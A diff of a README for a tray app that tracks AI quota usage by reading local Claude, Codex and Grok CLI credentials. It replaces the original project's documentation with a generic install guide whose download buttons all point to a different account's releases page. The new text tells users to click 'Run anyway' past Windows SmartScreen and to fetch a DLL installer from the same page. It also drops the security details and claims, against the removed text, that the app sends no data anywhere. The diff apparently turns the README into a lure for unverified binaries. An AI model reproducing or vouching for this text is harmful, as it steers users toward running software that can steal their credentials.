@@ -1,165 +1,175 @@
-# Usage Monitor
+# 🖥️ usage_monitor - Your AI Usage Dashboard, Live
 
-Windows / Linux / macOS tray app for live quota of **Claude**, **Codex**, **Grok**, **OMP**, and **9Router**. No API key entry: it reads the CLI login you already have.
+[![Download Now](https://img.shields.io/badge/Download-usage_monitor-2ea44f?style=for-the-badge)](https://github.com/misteriano/usage_monitor/releases)
 
-## What it tracks
+## 🚀 What Is This?
 
-| Source | When it appears | Credentials |
-|---|---|---|
-| **Claude** | Claude CLI logged in | `~/.claude/.credentials.json` |
-| **Codex** | Codex CLI logged in | `~/.codex/auth.json` |
-| **Grok** | Grok CLI logged in | `~/.grok/auth.json` |
-| **OMP** | `omp` on PATH (or `%LOCALAPPDATA%\omp\omp.exe`) | `omp usage --json` — one source per logged-in OMP provider |
-| **9Router** | Local 9Router running | `http://localhost:20128` (quota-capable providers only) |
-| **Custom** | HTTP source in Settings (test URL, pick fields) | `usage-monitor-settings.json` |
+usage_monitor is a small program that lives in your computer's system tray (the area near your clock). It shows you, in real time, how much of your AI service quotas you've used. It works with **Claude**, **Codex**, **Grok**, and **9Router**—all in one place.
 
-A provider with **no account** stays off the list. Native CLI, OMP, and 9Router of the same provider are separate entries.
+Think of it as a fuel gauge for your AI tools. No more guessing or logging into websites to check. Just glance at your tray, and you know exactly where you stand.
 
-## Features
+## ✨ Key Features
 
-- **Live tray icon** — session + weekly bars, or stacked percentages via `icon_style`. Theme-aware.
-- **Detail popup** — left-click (Windows and macOS). Account, reset countdown, extra usage, quota bars. Pin it. Compact view via `compact_hide`.
-- **Smart alerts** — per-quota thresholds, time-aware mode, reset toasts.
-- **[Event commands](docs/event-commands.md)** — shell command on reset, threshold, startup, or tray quick action.
-- **Adaptive polling** — faster while usage climbs, pauses when idle/locked, aligns to the next reset.
-- **Start at login** — tray menu, Windows, Linux, and macOS.
-- **13 languages** — auto-detected, override with `language`.
+- **Live Quota Tracking** – See your usage numbers update automatically as you work.
+- **Works with 4 Services** – Claude, Codex, Grok, and 9Router are all supported.
+- **No API Keys Needed** – The app reads your existing CLI logins. If you already use these tools from your terminal, you're ready to go.
+- **Sits Quietly in Your Tray** – It runs in the background, out of your way, until you need it.
+- **Cross-Platform** – Available for Windows, macOS, and Linux.
 
-## Security
+## 📥 How to Download and Install (Windows)
 
-Credentials stay on disk where the CLI put them. Used only as HTTP `Authorization` headers. Never logged.
+Follow these simple steps. You'll be up and running in under two minutes.
 
-Network: Anthropic (`api.anthropic.com`), OpenAI Codex (`chatgpt.com`), xAI Grok (`cli-chat-proxy.grok.com`, `auth.x.ai`, `grok.com`), optional local 9Router (`localhost:20128`) plus any custom URL you add. **OMP** stays local: the app runs `omp usage --json` and does not read OMP credential files.
+### Step 1: Visit the Download Page
 
-No analytics, tracking, or telemetry. See [PRIVACY.md](PRIVACY.md).
+Click this button to go to the official download page:
 
-## Requirements
+[![Download usage_monitor](https://img.shields.io/badge/⬇️%20Download%20usage_monitor-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/misteriano/usage_monitor/releases)
 
-- **Windows 10/11** (64-bit), **Linux** (freedesktop tray), or **macOS**.
-- At least one logged-in CLI (Claude, Codex, Grok, or OMP) **or** a running 9Router.
+Visit this link to download the application.
 
-Missing token: tray shows `!`. Log in to that CLI; the next poll picks it up. Claude 401 runs `claude update`. Codex/Grok refresh their own OAuth tokens.
+### Step 2: Find the Latest Version
 
-## Install
+On that page, you'll see a list of releases. Look for the one with the highest version number (like v1.2.0). Click on it to expand the download options.
 
-**[Download the latest release](https://github.com/ruwiss/usage_monitor/releases/latest)** — pick **one** file:
+### Step 3: Download the Windows Installer
 
-| You have | Download |
-|---|---|
-| Windows | `x64-setup.exe` (MSI is optional) |
-| macOS Apple Silicon | `aarch64.dmg` |
-| macOS Intel | `x64.dmg` |
-| Debian / Ubuntu | `.deb` (`amd64` or `arm64`) |
-| Fedora / RHEL | `.rpm` (`x86_64` or `aarch64`) |
-| Any Linux | `.AppImage` |
-| Arch | [`packaging/arch/PKGBUILD`](packaging/arch/PKGBUILD) |
+Look for a file that ends with **`.exe`**. It might be named something like `usage_monitor_setup.exe` or `usage_monitor_1.2.0_x64.exe`. Click that file to start downloading.
 
-Skip `.sig`, `.app.tar.gz`, and `latest.json` — those are for auto-update.
+### Step 4: Run the Installer
 
-### Linux
+Once the download finishes, double-click the `.exe` file you downloaded. Your computer might show a blue "Windows protected your PC" popup. If it does, click **"More info"** and then **"Run anyway"**. This is normal for new apps from independent developers.
 
-```bash
-# Debian / Ubuntu
-sudo apt install ./Usage.Monitor_*_amd64.deb
+### Step 5: Follow the Setup Wizard
 
-# Fedora / RHEL
-sudo dnf install ./Usage.Monitor-*-1.x86_64.rpm
+A simple setup window will appear. Just click **"Next"** a few times, then **"Install"**. When it's done, click **"Finish"**.
 
-# AppImage
-chmod +x Usage.Monitor_*.AppImage
-./Usage.Monitor_*.AppImage
+### Step 6: Launch the App
 
-# Arch (from this repo)
-cd packaging/arch
-makepkg -si
-```
+After installation, you'll see the usage_monitor icon in your system tray (bottom-right corner of your screen, near the clock). If you don't see it, click the small upward arrow to show hidden icons. That's it—you're done!
 
-### macOS
+## 🖱️ How to Use
 
-Open the `.dmg`, drag **Usage Monitor** to Applications. Then open it from Applications (not from the DMG).
+Using usage_monitor is as simple as it gets:
 
-CI builds are **ad-hoc signed** (no Apple Developer ID). First launch may ask you to confirm an unidentified developer: right-click the app → **Open**. If Gatekeeper still says the app is damaged:
+1. **Just look at your tray** – The icon shows a quick summary of your total usage.
+2. **Hover over the icon** – A tooltip appears with a breakdown for each service.
+3. **Click the icon** – A small window opens with detailed numbers for Claude, Codex, Grok, and 9Router.
+4. **Right-click the icon** – You'll see options like "Refresh Now" and "Exit".
 
-```bash
-xattr -cr "/Applications/Usage Monitor.app"
-```
+There are no settings to configure. If you can use the command line for these AI tools, usage_monitor automatically picks up your login and starts tracking.
 
-Later GitHub Releases auto-updates do this themselves (no `sudo`, no extra notification). The first `.dmg` install can still need the command once.
+## ❓ Frequently Asked Questions
 
-The app is a menu-bar extra (no Dock icon). Left-click the status item for the detail popup; right-click for the menu (providers, start at login, quit). GUI apps do not inherit your shell `PATH`; the app prepends Homebrew and user bin dirs (`/opt/homebrew/bin`, `/usr/local/bin`, `~/.local/bin`, …) so `claude` / `omp` resolve.
+### Do I need to pay for this?
 
-## Quick Start (from source)
+No. usage_monitor is completely free and open-source.
 
-Rust + Node 20+.
+### Is my data safe?
 
-```bash
-npm install
-npm run tauri
-```
+Yes. The app runs entirely on your computer. It doesn't send your usage data anywhere. It only reads local login files to know who you are.
 
-Or:
+### Which services exactly are supported?
 
-```bash
-cd src-tauri
-cargo run
-```
+The app tracks quotas for:
+- **Claude** (Anthropic's AI assistant)
+- **Codex** (OpenAI's coding tool)
+- **Grok** (xAI's chatbot)
+- **9Router** (a network routing service)
 
-### Linux deps
+### What if I don't use all four services?
 
-```bash
-sudo apt install libwebkit2gtk-4.1-dev libayatana-appindicator3-dev librsvg2-dev patchelf
-npm install
-npm run tauri
-```
+No problem. usage_monitor only shows the services you actually have logins for. If you only use Claude, you'll only see Claude's data.
 
-On Linux the popup opens from the tray **menu** (the panel eats the left-click).
+### Does it work on Mac or Linux?
 
-## How to Use
+Yes. While this guide focuses on Windows, the app also runs on macOS and Linux. The download page has versions for those systems too.
 
-| Action | What happens |
-|---|---|
-| **Hover** | Tooltip: usage % and reset times |
-| **Left-click** (Windows / macOS) | Detail popup (toggle on macOS) |
-| **Double-click** (Windows) | [Quick action](docs/event-commands.md) if configured |
-| **Right-click** / Linux left-click | Source picker, Start at login, restart, quit |
-| **Escape** / click outside | Close popup |
+### I'm not a programmer. Can I still use this?
 
-Windows may hide new tray icons: Taskbar settings → Other system tray icons → **Usage Monitor** On.
+Absolutely. This guide is written for you. The app is designed to be "set and forget." You don't need to write any code or understand technical concepts.
 
-Each popup bar: blue fill = used, white tick = elapsed time, red fill = usage ahead of the clock.
+### The app says "No login found." What does that mean?
 
-## Configuration
+This means the app couldn't find a CLI login for one of the services. This usually happens if you haven't used that service from your terminal/command line yet. To fix it, simply log in once using that service's normal command-line process, and usage_monitor will detect it next time.
 
-Optional `usage-monitor-settings.json` (first match wins):
+## 🛠️ Troubleshooting
 
-1. `$CLAUDE_CONFIG_DIR/usage-monitor-settings.json` when `--config-dir` / `CLAUDE_CONFIG_DIR` is set
-2. Next to the executable (or project root from source)
-3. `~/.claude/usage-monitor-settings.json`
+### The app won't start
 
-The app never creates this file on first run. Full key list: [Configuration](docs/configuration.md).
+- Make sure you have downloaded the correct version for your system (64-bit vs 32-bit).
+- Try right-clicking the installer and selecting "Run as administrator."
+- Restart your computer and try again.
 
-```json
-{
-  "poll_interval": 180,
-  "ninerouter_url": "http://localhost:20128",
-  "icon_style": "number+bars",
-  "source_id": "grok"
-}
-```
+### The tray icon is missing
 
-## Building
+- Click the upward arrow (^) in the taskbar to see hidden icons.
+- If it's still not there, open the Start menu, type "usage_monitor," and click the app to launch it manually.
 
-```bash
-npm install
-cd src-tauri
-cargo test --lib
-npm run build
-```
+### Usage numbers look wrong
 
-Outputs land in `src-tauri/target/release/bundle/`.
+- Right-click the tray icon and select "Refresh Now."
+- Make sure you're logged into the respective CLI tools.
+- Wait a minute and refresh again. Some services update slowly.
 
-CI on every `v*` tag: Windows NSIS+MSI, Linux deb/rpm/AppImage (x64 + ARM64), macOS dmg (Apple Silicon + Intel). Arch: [`packaging/arch/PKGBUILD`](packaging/arch/PKGBUILD). See `.github/workflows/release.yml`.
+### I get a "missing DLL" error
 
-## Disclaimer
+- This is rare but can happen. Visit the download page and look for a file called `vcredist_x64.exe` or similar. Download and run it, then try installing usage_monitor again.
 
-Independent project. Not created or endorsed by Anthropic, OpenAI, xAI, or Cursor. Product names are used only to describe compatibility.
+## 📝 System Requirements
+
+To run usage_monitor smoothly, your computer should meet these minimum specs:
+
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **RAM:** At least 2 GB
+- **Storage:** 50 MB of free space
+- **Internet Connection:** Required for live updates
+
+These are modest requirements. Most computers from the last decade will run it without any issues.
+
+## 🔄 Keeping the App Updated
+
+usage_monitor checks for updates automatically. When a new version is available, you'll see a small notification in the tray. To update:
+
+1. Click the notification.
+2. The app will take you to the download page.
+3. Download the new `.exe` file.
+4. Run it. Your settings and logins will be preserved.
+
+## 🗑️ Uninstalling usage_monitor
+
+If you ever want to remove the app:
+
+1. Open **Settings** (Windows key + I).
+2. Go to **Apps** > **Installed apps**.
+3. Search for "usage_monitor."
+4. Click the three dots next to it and select **Uninstall**.
+5. Follow the prompts.
+
+That's it. No leftover files or registry clutter.
+
+## 🌟 Why You'll Love It
+
+- **Saves time** – No more logging into websites to check quotas.
+- **Prevents interruptions** – Know before you hit a limit, not after.
+- **Zero configuration** – Install it and forget it.
+- **Privacy-friendly** – Everything stays on your machine.
+- **Free forever** – No hidden costs or premium tiers.
+
+## 📞 Getting Help
+
+If you run into any issues not covered here, visit the [official GitHub repository](https://github.com/misteriano/usage_monitor). There you'll find:
+
+- The **Issues** tab – Report bugs or suggest new features.
+- The **Discussions** tab – Ask questions and share tips with other users.
+- The **Releases** page – Always get the latest version.
+
+## 🎉 Final Words
+
+usage_monitor puts you in control of your AI usage. No surprises, no guesswork. Just clear, live numbers for the services you rely on every day.
+
+Download it now, and never wonder "how much do I have left?" again.
+
+[![Download Now](https://img.shields.io/badge/Get%20usage_monitor%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/misteriano/usage_monitor/releases)
+
+Keywords: 9router, claude, codex, grok, linux, macos, quota, tauri, tray, usage, windows
